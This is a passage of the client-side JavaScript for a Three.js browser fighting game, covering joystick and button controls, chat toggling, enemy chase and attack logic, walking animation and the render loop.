            group.add(new THREE.Mesh(new THREE.CylinderGeometry(0.15, 0.15, 0.8, 32), cloth)).position.set(-0.9, 3.5, 0);
            group.add(new THREE.Mesh(armGeo, skin)).position.set(-0.9, 2.7, 0);
            group.add(new THREE.Mesh(new THREE.CylinderGeometry(0.15, 0.15, 0.8, 32), cloth)).position.set(0.9, 3.5, 0);
            group.add(new THREE.Mesh(armGeo, skin)).position.set(0.9, 2.7, 0);
            
            return group;
        }
        
        function setupEvents() {
            joystick.addEventListener('mousedown', onJoystickStart);
            joystick.addEventListener('touchstart', onJoystickStart, { passive: false });
            document.addEventListener('mousemove', onJoystickMove);
            document.addEventListener('touchmove', onJoystickMove, { passive: false });
            document.addEventListener('mouseup', onJoystickEnd);
            document.addEventListener('touchend', onJoystickEnd);
            
            document.getElementById('ultimate').addEventListener('click', activateUltimate);
            document.getElementById('thunder-skill').addEventListener('click', activateThunderSkill);
            document.addEventListener('click', (e) => {
                if (!e.target.closest('.btn') && !e.target.closest('#joystick') && !e.target.closest('#chat-container')) {
                    useAttack();
                }
            });
            
            document.getElementById('restart-btn').addEventListener('click', restartGame);
            document.getElementById('win-restart-btn').addEventListener('click', restartGame);
            document.getElementById('back-to-menu-btn').addEventListener('click', backToMenu);
            document.getElementById('back-to-menu-win-btn').addEventListener('click', backToMenu);
            
            document.getElementById('chat-toggle').addEventListener('click', toggleChat);
            document.getElementById('chat-close').addEventListener('click', toggleChat);
            document.getElementById('chat-send').addEventListener('click', sendChatMessage);
            document.getElementById('chat-input').addEventListener('keypress', (e) => {
                if (e.key === 'Enter') sendChatMessage();
            });
            
            window.addEventListener('resize', () => {
                camera.aspect = window.innerWidth / window.innerHeight;
                camera.updateProjectionMatrix();
                renderer.setSize(window.innerWidth, window.innerHeight);
            });
        }
        
        function onJoystickStart(e) { e.preventDefault(); isJoystickActive = true; updateJoystickPos(e); }
        function onJoystickMove(e) { if (!isJoystickActive) return; e.preventDefault(); updateJoystickPos(e); }
        function onJoystickEnd() { isJoystickActive = false; joystickHandle.style.top = '30px'; joystickHandle.style.left = '30px'; playerVelocity.set(0, 0, 0); isPlayerWalking = false; }
        
        function updateJoystickPos(e) {
            const rect = joystick.getBoundingClientRect();
            const cx = rect.left + rect.width / 2;
            const cy = rect.top + rect.height / 2;
            let clientX = e.clientX || (e.touches && e.touches[0].clientX) || 0;
            let clientY = e.clientY || (e.touches && e.touches[0].clientY) || 0;
            
            const dx = Math.max(-30, Math.min(30, clientX - cx));
            const dy = Math.max(-30, Math.min(30, clientY - cy));
            
            joystickHandle.style.left = (30 + dx) + 'px';
            joystickHandle.style.top = (30 + dy) + 'px';
            
            playerVelocity.x = (dx / 30) * playerSpeed;
            playerVelocity.z = (dy / 30) * playerSpeed;
            
            if (Math.abs(dx) > 2 || Math.abs(dy) > 2) {
                player.rotation.y = Math.atan2(playerVelocity.x, playerVelocity.z);
                isPlayerWalking = true;
            } else {
                isPlayerWalking = false;
            }
        }
        
        function animate() {
            requestAnimationFrame(animate);
            const delta = Math.min(clock.getDelta(), 0.1);
            
            if (!gameOver && !gameWin) {
                if (!isPlayerStunned) {
                    player.position.x += playerVelocity.x;
                    player.position.z += playerVelocity.z;
                }
                player.position.x = Math.max(-14, Math.min(14, player.position.x));
                player.position.z = Math.max(-14, Math.min(14, player.position.z));
                
                // Enemy AI
                const dir = new THREE.Vector3().subVectors(player.position, enemy.position).normalize();
                const dist = player.position.distanceTo(enemy.position);
                const inHouse = Math.abs(player.position.x) < 3.5 && Math.abs(player.position.z) < 3.5;
                
                if (dist > 2 && !inHouse && !isPlayerStunned) {
                    enemy.position.x += dir.x * 0.03;
                    enemy.position.z += dir.z * 0.03;
                    enemy.rotation.y = Math.atan2(dir.x, dir.z);
                } else if (!inHouse && !isUltimateActive && !isPlayerStunned) {
                    lastEnemyAttackTime += delta;
                    if (lastEnemyAttackTime >= enemyAttackInterval) {
                        playerHP -= enemyAttackDamage;
                        lastEnemyAttackTime = 0;
                        updateUI();
                        if (playerHP <= 0) { playerHP = 0; triggerDefeat(); }
                        saveGameState();
                    }
                }
                
                if (attackCooldown > 0) attackCooldown -= delta;
                
                updateUltimate(delta);
                updateThunderSkill(delta);
                updateEnemySkill(delta);
                
                // Walking animation
                if (isPlayerWalking && !isPlayerStunned) {
                    walkCycle += 0.3;
                    player.children.forEach(child => {
                        if (child.userData?.type === 'leftLeg') child.rotation.x = Math.sin(walkCycle) * 0.3;
                        if (child.userData?.type === 'rightLeg') child.rotation.x = -Math.sin(walkCycle) * 0.3;
                    });
                }
                
                enemyAnimationTime += delta;
                enemy.children.forEach(child => {
                    if (child.userData?.type === 'leftLeg') child.rotation.x = Math.sin(enemyAnimationTime * 5) * 0.3;
                    if (child.userData?.type === 'rightLeg') child.rotation.x = -Math.sin(enemyAnimationTime * 5) * 0.3;
                });
                
                camera.position.x = player.position.x;
                camera.position.z = player.position.z + 10;
                camera.lookAt(player.position.x, player.position.y + 2, player.position.z);
                
                if (Math.random() < 0.05) { savePlayerData(); saveGameState(); }
            }
            
            renderer.render(scene, camera);
        }
        
        // ========== INIT ==========
        document.getElementById('multiplayer-status').textContent = `🎮 ${playerName} - Menghubungkan...`;
        init();
        console.log('✅ Game fully loaded - Player:', playerName, 'ID:', targetId);
    </script>
</body>
